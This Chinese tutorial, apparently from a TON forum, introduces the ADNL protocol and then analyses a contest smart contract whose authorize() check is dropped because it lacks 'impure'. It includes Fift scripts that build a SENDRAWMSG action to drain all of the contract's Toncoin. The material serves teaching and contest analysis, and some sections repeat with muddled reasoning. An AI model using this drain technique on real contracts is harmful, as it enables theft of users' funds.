ref: https://tonresear.ch/t/get-requests-in-ton-lesson-2-adnl-protocol-intro/443
# ANDL 协议简介

在创建 Web3/区块链应用程序时，常常需要从区块链中获取数据，例如查看账户的最新交易记录或调用合约的方法。

为此，您可以使用中介服务，这些服务要么索引区块链并为您提供汇总信息，要么作为代理服务，通过自身传递您的请求。

然而，使用中介可能存在风险、错误或故意歪曲事实，甚至可能导致欺诈。


TON 拥有网络协议，通过这些协议，您可以在没有中介的情况下接收信息。
ADNL（Abstract Datagram Network Layer）就是这样的一种协议。

在本教程中，我们将连接到轻客户端服务器（Lightservers），并通过 ANDL 获取账户信息。

ADNL 是一种在 IPv4（将来还支持 IPv6）上运行的覆盖层、点对点、不可靠（小尺寸）数据报协议，
如果 UDP 不可用，还可以选择回退到 TCP。

使用 ANDL，您可以直接从 TON 区块链获取数据，而无需中介。

## 介绍

每个参与者都有一个 256 位的 ADNL 地址。ADNL 协议允许您使用 ADNL 地址发送（不可靠的）和接收数据报。
IP 地址和端口号都被 ADNL 协议隐藏。

为了建立连接，需要使用握手机制。客户端使用 TCP 连接到服务器，并发送一个 ADNL 握手数据包，其中包含服务器的抽象地址、客户端的公钥以及由客户端确定的加密 AES-CTR 会话参数。

要连接到轻客户端（Lightclients），我们需要以下列表：
- 主网： [https://ton.org/global.config.json](https://ton.org/global.config.json)
- 测试网： [https://ton.org/testnet-global.config.json](https://ton.org/testnet-global.config.json)

[了解更多](https://docs.ton.org/learn/networking/low-level-adnl)关于该协议的信息。


---
# 如何在 TON 上黑客入侵简单的智能合约

## 介绍

在本文中，我们将分析如何在 TON 网络中黑客入侵一个简单的智能合约。如果你不熟悉 TON 或者智能合约的编写，别担心，本文既适合智能合约开发专家的简要分析，也适合初学者的详细解析。

### 什么是 TON？

TON 技术网络是一个虚拟机网络 [TVM](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview)。TVM 允许执行某些代码。应用程序开发人员将程序加载到 TVM 框架中。网络上的预期程序由智能合约处理。

在本文中，我们将分析一个简单的智能合约，它允许用户进行相互资金管理。

### 行为模型

行为模型是一种计算模型，是 TON 智能合约的基础。在这个模型中，每个智能合约可以接收一条消息，改变状态，或者每次接收一条或多条消息。值得注意的是，智能合约拥有自己的余额。

### 生产环境中的黑客入侵

由于行为模型中的智能合约通过消息进行“通信”，如果发生黑客入侵，通常是通过发送一条消息，将智能合约的余额转移到黑客的地址。

### FunC 和 Fift

TON 智能合约保证了 TON 网络的稳定运行。开发智能合约时，有低级语言 Fift 和高级语言 FunC。

TON 经常举办各种比赛，包括合约和黑客比赛。我们将分析的正是其中一场比赛的智能合约。

> 如果你想了解 TON，可以参阅我的免费课程和激动人心的游戏教程，见 [链接](https://github.com/romanovichim/TonFunClessons_eng)。

### 分析结构

首先，我们将简要了解这个智能合约并进行初步分析。如果你对 TON 网络不太熟悉，可以直接跳到详细解析部分。

## 快速分析

在分析如何入侵合约之前，我们先来解读一下合约。

### 智能合约解析

一个智能合约实现了以下逻辑：

这个合约是一个非常简化的共同基金，适合两个人，它允许他们通过发送消息来管理合约的余额。

> 在 TON 的行为模型中，每个智能合约可以接收一条消息，改变自己的状态，或者每次发送一条或多条消息，因此交互是通过消息进行的。

在其存储中，合约保存了两个地址，当发送消息时，合约检查消息是否来自这两个地址中的一个（某种形式的授权），然后将消息体放入寄存器 c5（输出动作寄存器），从而允许管理智能合约的资金。

智能合约代码如下：

```
{-

  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
  Contract contains intentional bugs, do not use in production

-}

#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

() execute (cell) impure asm "c5 POPCTR";

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}

() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

我们逐步解析代码，首先在智能合约的开头，我们写了一个辅助函数来处理智能合约的存储，`load_data()` 函数将从 `c4` 中将两个地址加载到全局变量 `addr1` 和 `addr2` 中。合约的逻辑假设只能从这些地址之一“启动”。

```
#include "stdlib.func";

;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

global slice addr1;
global slice addr2;

() load_data () impure {
  slice ds = get_data().begin_parse();
  addr1 = ds~load_msg_addr();
  addr2 = ds~load_msg_addr();
}
```

接下来是 `recv_internal()` 方法，在一开始检查消息是否为空，跳过消息标志，并从消息中提取发送者的地址：

```
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();
}
```

接着，我们从存储中获取地址，并检查消息的发送者地址是否与存储中的地址之一匹配。

```
() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);
	}
```

此处存在漏洞，`authorize()` 函数缺少 `impure` 指定符，将导致编译器删除该函数，因为根据文档：

`impure` 指定符表示函数可能具有一些不应忽略的副作用。例如，如果函数可以修改合约存储、发送消息或在数据无效时抛出异常并且函数旨在验证这些数据，我们必须指定 `impure` 指定符。

如果没有指定 `impure` 且函数调用的结果未被使用，则 FunC 编译器可能会删除该函数调用。

在智能合约的结尾，消息体被写入输出动作寄存器 `c5`。因此，要进行黑客攻击，我们只需发送一条消息，将 Toncoin 加密货币从智能合约中取出。

```
() execute (cell) impure asm "c5 POPCTR";

() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

### 破解信息解析

要发送消息，我们需要编写一个 fift 脚本（它将生成一个包含我们将发送到 TON 网络的 cell 结构的包），我们先从消息体开始。

```
"TonUtil.fif" include
<b  b> =: message
```

根据文档，消息本身可能如下所示（接下来代码为 FunC）：

```
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
  .end_cell();
```

因此，我们在消息体中写入我们要提取 Toncoin 的地址，将金额表示为 0 Gram，不在消息体中写入任何内容，得到：

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message
```

但是在寄存器 `c5` 中我们需要放入的不是消息，而是用于该消息的操作。我们将使用 `SENDRAWMSG` 发送消息。

首先，让我们理解如何在 `c5` 寄存器中存储数据。根据[文档](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=result-of-tvm-execution)，`c5` 是一个包含上一个操作和最后一个操作的 cell。我们没有上一个操作

，因此创建一个空的 cell，但我们需要 `SENDRAWMSG` 的 cell。

我们在操作之前不使用任何选项，并使用零 Gas 费用，因为执行代码已经包括在价格中。

接下来让我们创建一条消息：

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message
<sendrawmsg message 1 0> =: body
body constant 5 sys
```

最后一行用于将寄存器 `c5` 写入 `body`。

我们得到以下内容：

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message
<sendrawmsg message 1 0> =: body
body constant 5 sys
```

成功！我们成功地从智能合约中取出了 Toncoin。

## 详细解析

让我们更详细地了解上述内容。

### 实现逻辑

1. 智能合约会收到一条消息，并解析消息的地址。如果地址与存储中存储的地址之一匹配，则消息体会传递到一个 `cell`，该 `cell` 是寄存器 `c5`，包含上一个操作和最后一个操作。因为消息体是在 `SENDRAWMSG` 的消息中传递的，所以合约可以自己发送该消息，导致资金被取走。

2. 在 `recv_internal()` 方法中，我们可以看到，在消息体为空的情况下，消息被忽略，而没有被传递到 `c5`。通过这一点，我们可以推测，如果消息体不为空，则消息体将被传递到 `c5`。

3. `recv_internal()` 方法检查消息的发送者地址是否与存储中的地址之一匹配。如果不匹配，则该消息将被忽略。如果匹配，则会将消息体传递到 `c5`。通过这一点，我们可以推测，虽然消息可以被传递到 `c5`，但如果消息体是空的，则该消息将被忽略，而不会被传递到 `c5`。

4. 在 `recv_internal()` 方法的最后一步，消息体被传递到 `c5`，这是因为消息体是在 `SENDRAWMSG` 消息中传递的。

## 结论

通过分析智能合约代码，我们可以发现合约存在漏洞，因为 `authorize()` 函数缺少 `impure` 指定符，这导致编译器删除了该函数的调用。这个漏洞使得黑客可以发送一条消息，将 Toncoin 从智能合约中取出。

在智能合约开发过程中，我们需要特别注意合约中的每一个细节，以确保其安全性。希望这篇文章能帮助你更好地理解 TON 智能合约以及如何防范潜在的安全问题。

## 参考资料

1. TON 官方文档：https://ton-blockchain.github.io/docs/
2. FunC 语言文档：https://ton-blockchain.github.io/docs/#/func/README
3. Fift 语言文档：https://ton-blockchain.github.io/docs/#/fift/README
4. The Open Network (TON) 官方网站：https://ton.org/

---
### 黑客入侵的消息解析

要发送消息，我们需要编写一个 fift 脚本（它将生成一个包含我们将发送到 TON 网络的 cell 结构的包），让我们从消息体开始，为此我们需要 `<b b>`

```
"TonUtil.fif" include
<b  b> =: message
```

根据文档，消息本身可能如下所示（以下代码为 FunC）：

```
var msg = begin_cell()
  .store_uint(0x18, 6)
  .store_slice(addr)
  .store_coins(amount)
  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
  .store_slice(message_body)
  .end_cell();
```

因此，我们在消息体中写入我们要提取 Toncoin 的地址，将金额表示为 0 Gram，不在消息体中写入任何内容，我们得到：

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message
```

但是在寄存器 `c5` 中，我们需要放入的不是消息，而是用于该消息的操作。我们将使用 `SENDRAWMSG` 发送消息。

首先，让我们理解如何在 `c5` 寄存器中存储数据。根据[文档](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=result-of-tvm-execution)，`c5` 是一个 cell，包含上一个操作和最后一个操作的链接。我们没有上一个操作，所以会有一个空的 `Builder`。

```
<b <b b> ref, 这里是消息发送 ref, b>
```

> `ref` - 将 Cell c 的引用添加到 Builder b。

接下来是 `SENDRAWMSG`，我们从[这里的第 371 行](https://github.com/ton-blockchain/ton/blob/d01bcee5d429237340c7a72c4b0ad55ada01fcc3/crypto/block/block.tlb)直接从块中获取函数的“代码”，并查看根据[TVM 文档第 137 页](https://ton-blockchain.github.io/docs/tvm.pdf)，应收集的参数：

- 函数“代码”：0x0ec3c86d 32 u
- 消息发送模式，在我们的情况下是 128，因为我们想要提取所有资金 128 8 u
- 消息 `message`

> x u - 位数为 x 的无符号整数

我们得到：

```
<b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b>
```

现在我们将所有这些包裹在一个构造器中，因为我们需要一个消息的 cell：

```
"TonUtil.fif" include
<b 0x18 6 u, 0 your address Addr, 0 Gram, 0 1 4 + 4 + 64 + 32 + 1 + 1 + u, b> =: message

<b <b <b b> ref, 0x0ec3c86d 32 u, 128 8 u, message ref, b> ref, b>
```

这样，我们就可以构建一个完整的消息体，并通过 `SENDRAWMSG` 发送消息，从而成功地提取 Toncoin。

### 如何发送消息？

TON 提供了几种方便的选项来发送 `内部` 消息，首先是通过 [toncli](https://github.com/disintar/toncli) 发送：

> toncli - 便捷的命令行界面

1) 首先我们收集 Fift 脚本，我们已经完成了这一步
2) 使用 `toncli send` 命令

带图片的教程 [在这里](https://github.com/disintar/toncli/blob/master/docs/advanced/send_fift_internal.md)。

第二个方便的选项是 Go 语言库 tonutils-go，如何使用 tonutils-go 发送消息，可以在我的 [之前的课程](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/14lesson/wallet_eng.md) 中找到。

## 详细分析

### 解析共同基金合约代码

#### 智能合约存储

让我们从智能合约的“存储”开始解析代码，智能合约在TON网络中的永久数据存储在 c4 寄存器中。

> 更多关于寄存器的信息，请参阅[这里](https://ton-blockchain.github.io/docs/tvm.pdf) 第1.3段

为了方便，我们将在合约中写一个注释，说明我们将在合约中存储什么，我们将存储两个地址（`addr1` 和 `addr2`）：

	;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

> ;; 两个分号是单行注释的语法

#### 辅助函数框架

为了方便与存储器的交互，我们将编写一个辅助函数来卸载数据，首先我们声明它：

	() load_data () impure {

	}

> `impure` 是一个关键字，表示该函数会更改智能合约数据。如果函数可以修改合约存储、发送消息或在某些数据无效时抛出异常，并且函数的目的是验证这些数据，则必须指定 `impure` 修饰符。**重要**：如果未指定 impure 并且函数调用的结果未被使用，则 FunC 编译器可能会移除该函数调用。

#### 全局变量和数据类型

在此智能合约中，地址应该存储在 `slice` 类型的全局变量中。TON 中有 4 种主要类型：

在我们的简单智能合约中，我们只使用四种类型：

- Cell (cell) - 由 1023 位数据和最多 4 个指向其他单元的链接组成的 TVM 单元
- Slice (slice) - 用于从单元解析数据的 TVM 单元的部分表示
- Builder - 包含最多 1023 位数据和最多四个链接的部分构建单元；可用于创建新单元
- Integer - 有符号的 257 位整数

更多关于 FunC 中的类型：
[在这里简要介绍](https://ton-blockchain.github.io/docs/#/smart-contracts/) 
[在这里的 2.1 节中部署](https://ton-blockchain.github.io/docs/fiftbase.pdf) 

简单来说，cell 是一个密封的单元，slice 是当单元可以被读取时，builder 是当你组装单元时。

要使变量[全局化](https://ton-blockchain.github.io/docs/#/func/global_variables?id=global-variables) 需要添加 `global` 关键字。

让我们声明两个 `slice` 类型的地址：

	global slice addr1;
	global slice addr2;

	() load_data () impure {

现在在辅助函数中，我们将从寄存器中获取地址并将它们传递给全局变量。

#### 数据存储在 TON 或寄存器 c4 中

为了从 c4 中“获取”数据，我们需要两个来自 [FunC 标准库](https://ton-blockchain.github.io/docs/#/func/stdlib) 的函数。

具体来说：
`get_data` - 从 c4 寄存器中获取单元。
`begin_parse` - 将单元转换为 slice

让我们将这个值传递给 slice ds：

	global slice addr1;
	global slice addr2;

	() load_data () impure {
	  slice ds = get_data().begin_parse();

	}

#### 上传地址

使用 `load_msg_addr()` 从 ds 地址加载 - 它从 slice 中加载唯一的前缀，该前缀是有效的 MsgAddress。我们有两个，所以我们“卸载”两次。

> `load_msg_addr()` 是标准库的函数，所以不要忘记使用 [include](https://ton-blockchain.github.io/docs/#/func/compiler_directives?id=include) 指令添加库本身

	#include "stdlib.func";

	;; storage#_ addr1:MsgAddress addr2:MsgAddress = Storage;

	global slice addr1;
	global slice addr2;

	() load_data () impure {
	  slice ds = get_data().begin_parse();
	  addr1 = ds~load_msg_addr();
	  addr2 = ds~load_msg_addr();
	}


#### 智能合约的"主体"

为了让智能合约实现任何逻辑，它必须有可以访问的方法。

##### 保留的方法

在 TON 网络上的智能合约有两个保留的方法可以访问。

首先是 `recv_external()`，这个函数在从外部世界（即不属于 TON 的消息）发来请求时执行，例如当我们自己生成消息并通过 lite-client 发送时（关于安装 lite-client）。其次是 `recv_internal()`，这个函数在 TON 内部发生事件时执行，例如当任何合约访问我们的合约时。

Lite-client 是一种软件，它连接到全节点以与区块链交互。它们帮助用户访问和与区块链互动，而无需同步整个区块链。

这个智能合约使用了 `recv_internal()`：

```func
() recv_internal (in_msg_full, in_msg_body) {

}
```

这里应该会有一个问题，那就是 `in_msg_full` 和 `in_msg_body` 是什么。
根据 [TON 虚拟机 - TVM](https://ton-blockchain.github.io/docs/tvm.pdf) 的文档，当 TON 链中的某个账户发生事件时，它会触发一个交易。

每个交易最多包含 5 个阶段。更多细节在[这里](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases)。

我们感兴趣的是**计算阶段**。更具体地说，是初始化时“堆栈上的内容”。对于正常的后触发交易，堆栈的初始状态如下：

5 个元素：
- 智能合约余额（以 nanoTons 为单位）
- 收到的消息余额（以 nanoTons 为单位）
- 包含收到的消息的 cell
- 收到的消息体，类型为 slice
- 函数选择器（对于 recv_internal 是 0）

在这个智能合约的逻辑中，我们不需要余额等信息，因此 `in_msg_full` 和 `in_msg_body`，即包含收到的消息的 cell 和消息体作为参数传入。

##### 填充方法 - 检查空消息

我们在 `recv_internal()` 中要做的第一件事是跳过空消息的处理。我们将使用 `slice_empty()`（标准库函数，[文档中的描述链接](https://ton-blockchain.github.io/docs/#/func/stdlib?id=slice_empty)）进行检查，并在遇到空消息时使用 `return()` 结束智能合约的执行。

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; 忽略空消息
		return ();
	}
}
```

下一步是从完整消息中获取地址，但在我们“到达地址”之前需要解析消息。

为了获取地址，我们需要使用 `begin_parse` 将 cell 转换为 slice：

```func
slice cs = in_msg_full.begin_parse();
```

##### 读取消息 - 跳过标志

现在我们需要将结果 slice“减”到地址。使用 [FunC 标准库](https://ton-blockchain.github.io/docs/#/func/stdlib) 中的 `load_uint` 函数加载一个无符号的 n 位整数，从 slice 中“减”去标志。

```func
int flags = cs~load_uint(4);
```

在本教程中，我们不会详细讨论标志，但你可以在[第 3.1.7 节](https://ton-blockchain.github.io/docs/tblkch.pdf)中了解更多信息。

获取标志后，我们将忽略我们不感兴趣的回退消息：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; 忽略空消息
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; 忽略所有回退消息
		return ();
	}
}
```

##### 获取发送者的地址

最后，我们可以从消息中获取发送者的地址，通过使用熟悉的 `load_msg_addr()` 函数，并立即使用我们之前编写的辅助函数从 `c4` 寄存器中加载地址：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; 忽略空消息
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; 忽略所有回退消息
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();

}
```

##### "授权"

现在，在继续智能合约的逻辑之前，我们应该检查发送者地址是否是存储中的第一个或第二个地址，即我们要确保进一步的逻辑仅由智能合约的所有者执行。为此，我们将创建一个辅助函数 `authorize()`：

```func
() authorize (sender) inline {

}
```

`inline` 修饰符将函数体直接放入父函数的代码中。

如果收到的消息不是来自我们的两个地址之一，我们将抛出异常并结束智能合约的执行。为此，我们将使用[built-ins](https://ton-blockchain.github.io/docs/#/func/builtins)异常。

##### 异常

可以通过条件原语 `throw_if` 和 `throw_unless` 以及无条件的 `throw` 抛出异常。

我们将使用 `throw_if` 并传递任意错误代码。

```func
() authorize (sender) inline {
  throw_unless(187, equal_slice_bits(sender, addr1) | equal_slice_bits(sender, addr2));
}
```

> `equal_slice_bit` - 标准库函数，检查相等性

##### 允许黑客入侵合约的相同错误

看起来似乎一切正常，但这里却存在一个错误，这个错误使得黑客可以入侵智能合约 - 由于缺少 `impure` 修饰符，该函数在编译时将被删除。

根据文档：

`impure` 修饰符表示该函数可能会产生一些副作用，这些副作用不应该被忽略。例如，如果函数可能修改合约存储、发送消息或在某些数据无效时抛出异常，并且该函数的目的是验证这些数据，那么我们必须指定 `impure` 修饰符。

如果未指定 `impure`，且函数调用的结果未被使用，那么 FunC 编译器可以且将删除该函数调用。

这就是为什么这个合约容易受到攻击 - 授权将在编译时消失。

##### 合约逻辑

尽管发现了漏洞，我们还是分析一下合约的逻辑：从消息体中获取请求的 cell：

```func
cell request = in_msg_body~load_ref();
```

> load_ref() - 从 slice 中加载第一个引用。

剩下的最后一部分是 `execute()` 函数：

```func
() recv_internal (in_msg_full, in_msg_body) {
	if (in_msg_body.slice_empty?()) { ;; 忽略空消息
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; 忽略所有回退消息
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	load_data();
	authorize(sender_address);

	cell request = in_msg_body~load_ref();
	execute(request);
}
```

##### 填充 c5 寄存器

FunC 支持汇编中定义函数（意思是 Fift）。这发生如下 - 我们将一个函数定义为低级别的 TVM 原语。在我们的例子中：

```func
() execute (cell) impure asm "c5 POPCTR";
```

如你所见，使用了 `asm` 关键字。

POPCTR c(i) - 从堆栈中弹出 x 的值并存储在控制寄存器 c(i) 中。

你可以从 [TVM](https://ton-blockchain.github.io/docs/tvm.pdf) 的第 77 页看到可能的原语列表。

##### c5 寄存器

`c5` 寄存器包含输出操作。因此，我们可以在这里放置一条将会提取资金的消息。



